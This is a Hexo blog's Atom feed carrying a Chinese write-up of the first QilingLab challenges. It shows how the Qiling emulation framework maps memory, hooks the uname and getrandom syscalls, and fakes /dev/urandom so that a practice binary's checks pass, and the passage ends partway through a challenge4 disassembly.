<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2024-11-23T07:10:17.437Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>初探Qiling framework</title>
    <link href="http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/"/>
    <id>http://s1nec-1o.github.io/2024/11/23/%E5%88%9D%E6%8E%A2Qiling-framework/</id>
    <published>2024-11-23T07:04:30.000Z</published>
    <updated>2024-11-23T07:10:17.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做完这些lab，对qiling的作用，这个framework的理解，更加的深，希望看到这里的读者可以自己去做一遍，不要纯看他人的wp，因为每道题都有着很多种解法，但是目标都是成功的hook或Hijack，Qiling还有着一些fuzz or 仿真的 example，我都会去做一遍的！同时接下来每周都有着很多考试，希望一切顺利~</p><h2 id="What-is-Qiling"><a href="#What-is-Qiling" class="headerlink" title="What is Qiling"></a>What is Qiling</h2><p>Qiling是一个先进的二进制仿真框架，具有以下特点：</p><ul><li><strong>Qiling</strong> 这个框架对于模拟运行二进制程序时的 hook 非常方便</li><li>模拟多平台：Windows、MacOS、Linux、Android、BSD、UEFI、DOS、MBR、以太坊虚拟机</li><li>模拟多架构：8086、X86、X86_64、ARM、ARM64、MIPS、RISCV、PowerPC</li><li>内置调试器，具有逆向调试功能</li><li>提供深入的内存、寄存器、操作系统级和文件系统级API</li><li>细粒度检测：允许在各个级别进行挂钩（指令&#x2F;基本块&#x2F;内存访问&#x2F;异常&#x2F;系统调用&#x2F;IO&#x2F;等）</li><li>支持跨架构和平台调试能力</li><li>真正的Python框架，可以轻松地在其上构建定制的安全分析工具</li><li>等等</li></ul><p>在qiling framework的github项目上还有几个示例demo，这里注意到了通过Qiling框架仿真模拟并对二进制程序进行hook可以更加方便的fuzz</p><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><p>要求在0x1337地址上写入0x1337</p><table><thead><tr><th align="left">Method</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>map</code></td><td align="left">Map a memory region at a certain location so it become available for access</td></tr><tr><td align="left"><code>unmap</code></td><td align="left">Reclaim a mapped memory region</td></tr><tr><td align="left"><code>unmap_all</code></td><td align="left">Reclaim all mapped memory regions</td></tr><tr><td align="left"><code>map_anywhere</code></td><td align="left">Map a memory region in an unspecified location</td></tr><tr><td align="left"><code>protect</code></td><td align="left">Modify access protection bits of a mapped region (rwx)</td></tr><tr><td align="left"><code>find_free_space</code></td><td align="left">Find an available memory region</td></tr><tr><td align="left"><code>is_available</code></td><td align="left">Query whether a memory region is available</td></tr><tr><td align="left"><code>is_mapped</code></td><td align="left">Query whether a memory region is mapped</td></tr></tbody></table><p>Qiling给出了这些Managing memory的方法</p><p>内存在被访问之前必须被映射。 <code>map</code>方法将连续的内存区域绑定到指定位置，并设置其访问保护位。可以提供字符串标签以便在映射信息表上轻松识别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.<span class="built_in">map</span>(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>, perms: <span class="built_in">int</span> = UC_PROT_ALL, info: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>) -&gt; <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>参数：-<code>addr</code> - 请求的映射基地址，应该在页面粒度上；- <code>size</code> - 映射大小（以字节为单位），必须是页面大小； - <code>perms</code> - 保护位图的乘积，定义此内存范围是否可读、可写和&#x2F;或可执行（可选）； - <code>info</code> - 将字符串标签设置为映射范围以方便识别（可选）</p><p>主要也是关注前两个参数，这里显然是执行 <code>ql.mem.map(0x1337// 4096 * 4096 , 0x1000);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.unmap(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>参数： - <code>addr</code> - 要取消映射的区域基地址 - <code>size</code> - 区域大小（以字节为单位）</p><p>如果请求的内存范围未完全映射，则引发： <code>QlMemoryMappedError</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = ql.mem.search(<span class="string">b&quot;\xFF\xFE\xFD\xFC\xFB\xFA&quot;</span>, begin= <span class="number">0x1000</span>, end= <span class="number">0x2000</span>)</span><br></pre></td></tr></table></figure><p>从部分内存范围中搜索字符串，begin和end参数均是可选的，去除则是整个内存范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.read(address, size)</span><br></pre></td></tr></table></figure><p>从内存中读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.write(address, data)</span><br></pre></td></tr></table></figure><p>写入内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">challenge1</span><span class="params">(ql)</span>:</span></span><br><span class="line"><span class="function">ql.mem.map(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span></span><br><span class="line"><span class="function">ql.mem.write(<span class="number">0x1337</span>, b<span class="string">&quot;\x39\x05&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1CCh]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1C4h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">utsname</span> name; <span class="comment">// [rsp+20h] [rbp-1C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+1A6h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">24</span>]; <span class="comment">// [rsp+1B0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1C8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">uname</span>(&amp;name) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;uname&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(s, <span class="string">&quot;QilingOS&quot;</span>);</span><br><span class="line">    s[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v8, <span class="string">&quot;ChallengeStart&quot;</span>);</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.sysname[v4] == s[v4] )</span><br><span class="line">        ++v2;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.version[v5] == v8[v5] )</span><br><span class="line">        ++v3;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="built_in">strlen</span>(s) &amp;&amp; v3 == <span class="built_in">strlen</span>(v8) &amp;&amp; v2 &gt; <span class="number">5</span> )</span><br><span class="line">      *a1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求在uname返回系统信息时的<code>sysname == &quot;QilingOS&quot; and version == &quot;ChallengeStart&quot;</code>。</p><p>需要通过劫持结构体</p><h4 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h4><p>POSIX 系统调用可以被挂钩以允许用户<strong>修改其参数</strong>、<strong>改变返回值</strong>或<strong>完全替换其功能</strong>。系统调用可以通过其名称或编号进行挂钩，并在一个或多个阶段进行拦截： <strong>- QL_INTERCEPT.CALL -</strong> ：当指定的系统调用即将被调用时，可用于完全替换系统调用功能；**- QL_INTERCEPT.ENTER -** ：在进入系统调用之前；可用于篡改系统调用参数值 <strong>- QL_INTERCEPT.EXIT -</strong> ：退出系统调用后，可能被用来篡改返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized system calls always use the same arguments list as the original</span></span><br><span class="line"><span class="comment"># ones, but with a Qiling instance on front. The Qiling instance may be used</span></span><br><span class="line"><span class="comment"># to interact with various subsystems, such as the memory or registers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_syscall_write</span>(<span class="params">ql: Qiling, fd: <span class="built_in">int</span>, buf: <span class="built_in">int</span>, count: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># read data from emulated memory</span></span><br><span class="line">        data = ql.mem.read(buf, count)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># select the emulated file object that corresponds to the requested</span></span><br><span class="line">        <span class="comment"># file descriptor</span></span><br><span class="line">        fobj = ql.os.fd[fd]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write the data into the file object, if it supports write operations</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(fobj, <span class="string">&#x27;write&#x27;</span>):</span><br><span class="line">            fobj.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        ret = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = count</span><br><span class="line"></span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_syscall_write(<span class="subst">&#123;fd&#125;</span>, <span class="subst">&#123;buf:#x&#125;</span>, <span class="subst">&#123;count&#125;</span>) = <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return a value to the caller</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/arm_linux/bin/arm_hello&#x27;</span>], <span class="string">r&#x27;rootfs/arm_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the following call to &#x27;set_syscall&#x27; sets &#x27;my_syscall_write&#x27; to execute whenever</span></span><br><span class="line">    <span class="comment"># the &#x27;write&#x27; system call is about to be called. that practically replaces the</span></span><br><span class="line">    <span class="comment"># existing implementation with the one in &#x27;my_syscall_write&#x27;.</span></span><br><span class="line">    ql.os.set_syscall(<span class="string">&#x27;write&#x27;</span>, my_syscall_write, QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># note that system calls may be referred to either by their name or number.</span></span><br><span class="line">    <span class="comment"># an equivalent alternative that replaces the write syscall by refering its number:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#ql.os.set_syscall(4, my_syscall_write)</span></span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>因此要通过ql.os.set_syscall中的QL_INTERCEPT.EXIT对返回值进行篡改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def my_uname_ret(ql ,*args): </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">struct utsname</span><br><span class="line">    &#123;</span><br><span class="line">        char sysname[65];</span><br><span class="line">        char nodename[65];</span><br><span class="line">        char release[65];</span><br><span class="line">        char version[65];</span><br><span class="line">        char machine[65];</span><br><span class="line">        char domainname[65];</span><br><span class="line">    &#125;;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">rdi_value=ql.arch.regs.read(&quot;rdi&quot;)</span><br><span class="line">ql.mem.write(rdi_value,b&#x27;QilingOS\x00&#x27;)</span><br><span class="line">ql.mem.write(rdi_value+65*3,b&#x27;ChallengeStart\x00&#x27;)</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">def challenge2(ql):</span><br><span class="line">ql.os.set_syscall(&quot;uname&quot;,my_uname_ret,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><p>这里有个要注意的点，my_uname_ret的参数要能接受三个参数，不然会报错</p><p>这里看到qiling的一个example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onexit_hook(self.ql, *self.get_syscall_args())</span><br></pre></td></tr></table></figure><p>Qiling都是通过一些函数，来进行hook的</p><blockquote><p>Qiling的这些hook，都是一些在程序的hook，并不像正常的程序的输入输出，例如这里在退出的地方执行这个oxexit_hook函数（个人理解）</p></blockquote><h3 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge3</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Fh] [rbp-51h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;v5, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="built_in">getrandom</span>((__int64)v7, <span class="number">32LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == v7[i] &amp;&amp; buf[i] != v5 )</span><br><span class="line">      ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">    *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的第一个想法就是hook掉getrandom，控制其函数体，然后将虚拟路径<code>/dev/urandom</code>映射到文件对象下</p><p>以下示例将虚拟路径<code>/dev/urandom</code>映射到托管系统上现有的<code>/dev/urandom</code>文件。当模拟程序访问<code>/dev/random</code>时，将访问映射文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from qiling import Qiling</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    ql = Qiling([r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;], r&#x27;rootfs/x86_linux&#x27;)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(r&#x27;/dev/urandom&#x27;, r&#x27;/dev/urandom&#x27;)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>以下示例将虚拟路径<code>/dev/random</code>映射到用户定义的文件对象，以允许对交互进行更细粒度的控制。请注意，映射对象扩展了<code>QlFsMappedObject</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;</span>], <span class="string">r&#x27;rootfs/x86_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>注意到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里其实是一个类，然后定义了一些函数，用self来代替<code>/dev/urandom</code>这个对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br></pre></td></tr></table></figure><h3 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E1D                               ; __int64 challenge4()</span><br><span class="line">.text:0000000000000E1D                               public challenge4</span><br><span class="line">.text:0000000000000E1D                               challenge4 proc near                    ; CODE XREF: start+18F↓p</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000E1D                               var_8= dword ptr -8</span><br><span class="line">.text:0000000000000E1D                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000E1D 55                            push    rbp</span><br><span class="line">.text:0000000000000E1E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000E21 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000E25 C7 45 F8 00 00 00 00          mov     [rbp+var_8], 0</span><br><span class="line">.text:0000000000000E2C C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000E33 EB 0B                         jmp     short loc_E40</span><br><span class="line">.text:0000000000000E33</span><br><span class="line">.text:0000000000000E35                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000E35</span><br><span class="line">.text:0000000000000E35                               loc_E35:                                ; CODE XREF: challenge4+29↓j</span><br><span class="line">.text:0000000000000E35 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000E39 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000E3C 83 45 FC 01                   add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000E3C</span><br><span class="line">.text:0000000000000E40</span><br><span 